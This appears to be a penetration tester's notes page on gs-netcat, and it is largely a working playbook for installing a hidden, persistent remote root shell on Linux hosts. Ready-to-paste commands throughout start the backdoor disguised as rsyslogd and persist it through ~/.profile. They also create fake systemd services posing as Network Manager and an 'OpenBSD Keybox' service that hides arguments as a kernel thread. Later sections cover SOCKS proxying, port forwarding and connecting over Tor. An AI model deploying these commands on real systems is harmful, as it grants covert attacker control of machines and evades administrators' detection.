# gs-netcat

### Overview

The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.

More on [https://www.gsocket.io](https://www.gsocket.io).

### Non Persistent backdoor

```
$(GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /path/to/gs-netcat")
```

### Client Connection

```
gs-netcat -i -s MySecret
```

* Above will spawn a full pty giving you the option to tab complete and use up arrow as long as CTRL+C

### Persisting the Server .profile

The following line in the user's \~/.profile starts the backdoor (once) when the user logs in. All in one line:

The '( )' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list.

```
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a rsyslogd /path/to/gs-netcat)
```

* Ensure there are no syntax errors or the next time a user logs in they will see this message&#x20;

```
ssh root@ubuntu.space
root@ubuntu.space's password: 
Last login: Mon Dec 30 19:29:55 2024 from 192.168.15.172
-bash: /root/.profile: line 11: syntax error: unexpected end of file
```

* when you are connected to the backdoor this is how your process will look&#x20;

```
1 S root         442       1  0  80   0 -   794 do_wai 19:43 ?        00:00:00 rsyslogd
1 S root         443     442  0  80   0 -   829 do_sel 19:43 ?        00:00:00  \_ rsyslogd
0 S root         528     443  0  80   0 -  2105 do_sel 19:47 pts/4    00:00:00      \_ -bash
```

* above will occur no matter how you connect to the server

```
gs-netcat -s MySecret
gs-netcat -s -i MySecret
```

### Persisting the Server systemd (Not Hidden)

* create secret file&#x20;

```
gs-netcat -g >/etc/systemd/gs-root-shell-key.txt
chmod 600 /etc/systemd/gs-root-shell-key.txt
cat /etc/systemd/gs-root-shell-key.txt
abc123
```

* create service file&#x20;

```
create /etc/systemd/system/NetworkManage.service
```

```
[Unit]
Description=Network Manager
Documentation=man:NetworkManager(8)
Wants=network.target
After=network-pre.target dbus.service
Before=network.target 

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/
ExecStart=/opt/gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il

[Install]
WantedBy=multi-user.target
```

<pre><code># ensure it does not exist first 
ls -lartF /etc/systemd/system/NetworkManage.service
# create the file
echo "[Unit]" >> /etc/systemd/system/NetworkManage.service
<strong>echo "Description=Network Manager" >> /etc/systemd/system/NetworkManage.service
</strong>echo "Documentation=man:NetworkManager(8)" >> /etc/systemd/system/NetworkManage.service
echo "Wants=network.target" >> /etc/systemd/system/NetworkManage.service
echo "After=network-pre.target dbus.service" >> /etc/systemd/system/NetworkManage.service
echo "Before=network.target" >> /etc/systemd/system/NetworkManage.service 
echo "" >> /etc/systemd/system/NetworkManage.service
echo "[Service]" >> /etc/systemd/system/NetworkManage.service
echo "Type=simple" >> /etc/systemd/system/NetworkManage.service
echo "Restart=always" >> /etc/systemd/system/NetworkManage.service
echo "RestartSec=10" >> /etc/systemd/system/NetworkManage.service
<strong>echo "WorkingDirectory=/" >> /etc/systemd/system/NetworkManage.service
</strong>echo "ExecStart=/opt/gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il" >> /etc/systemd/system/NetworkManage.service
echo "" >> /etc/systemd/system/NetworkManage.service
echo "[Install]" >> /etc/systemd/system/NetworkManage.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/NetworkManage.service

cat /etc/systemd/system/NetworkManage.service
</code></pre>

* after created

```
systemctl start NetworkManage.service
systemctl enable NetworkManage.service
systemctl status NetworkManage.service
```

* this is not great because the secret file path or the secret with -s will show up as \*\*\*\*\*\*\*\*\*\*\* in the process list

### Persisting the Server systemd (Zapper)

* Zapper is a great tool to hide your cmdline options
* pull the tool from&#x20;
* example service file, zapper is keybox and gs-netcat is crond in the below example
* make sure it doesnt exist first&#x20;

```
ls -lartF /etc/systemd/system/keybox.service
```

```
[Unit]
Description=OpenBSD Keybox Service
Documentation=man:keybox(8) man:keybox_config(2)
After=network.target auditd.service

[Service]
Type=oneshot
ExecStart=/usr/libexec/keybox -f -a '[cpuhp/0]' -n0 /sbin/crond -liqD -s abc123 &
KillMode=process
Restart=on-failure
RestartPreventExitStatus=255

[Install]
WantedBy=multi-user.target
Alias=keybox.service
```

* quick paste

```
echo "[Unit]" >> /etc/systemd/system/keybox.service
echo "Description=OpenBSD Keybox Service" >> /etc/systemd/system/keybox.service
echo "Documentation=man:keybox(8) man:keybox_config(2)" >> /etc/systemd/system/keybox.service
echo "After=network.target auditd.service" >> /etc/systemd/system/keybox.service
echo "" >> /etc/systemd/system/keybox.service
echo "[Service]" >> /etc/systemd/system/keybox.service
echo "Type=oneshot" >> /etc/systemd/system/keybox.service
echo "ExecStart=/usr/libexec/keybox -f -a '[cpuhp/0]' -n0 /sbin/crond -liqD -s abc123 &" >> /etc/systemd/system/keybox.service
echo "KillMode=process" >> /etc/systemd/system/keybox.service
echo "Restart=on-failure" >> /etc/systemd/system/keybox.service
echo "RestartPreventExitStatus=255" >> /etc/systemd/system/keybox.service
echo "" >> /etc/systemd/system/keybox.service
echo "[Install]" >> /etc/systemd/system/keybox.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/keybox.service
echo "Alias=keybox.service" >> /etc/systemd/system/keybox.service
```

* after creating the service file (make sure to alter the key

```
systemctl start keybox.service
systemctl enable keybox.service
systemctl status keybox.service
```

### Command Console

* If you connect to a listening gs-netcat server with the below options you will have access to the command console

```
gs-netcat -i -s MySecret 
```

* access it with CTRL+E c, you will see the below

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* this nicely provides a way to upload and download files as well as local commands just like in metasploit i.e. lls lcd

### Proxies

#### Server to act as a SOCKS4/4a/5 server:

```
gs-netcat -s MySecret -l -S
```

Client to listen on TCP port 1080 and forward any new connection to the server's SOCKS server:

```
gs-netcat -s MySecret -p 1080
```

#### TCP Port Forward all connections to 192.168.6.7:22

Server:

```
gs-netcat -s MySecret -l -d 192.168.6.7 -p 22 
```

Client to listen on TCP port 2222 and forward any new connection to the the server. The server then forwards the connection to 192.168.6.7:22.

```
gs-netcat -s MySecret -p 2222
ssh -p 2222 root@127.0.0.1
```

The same using 1 command:

```
ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored
```

### Tor Client Connection

* For the best security you should always connect to the server via tor
* Start tor in one window&#x20;

```
tor
gs-netcat -i -s MySecret -T
```
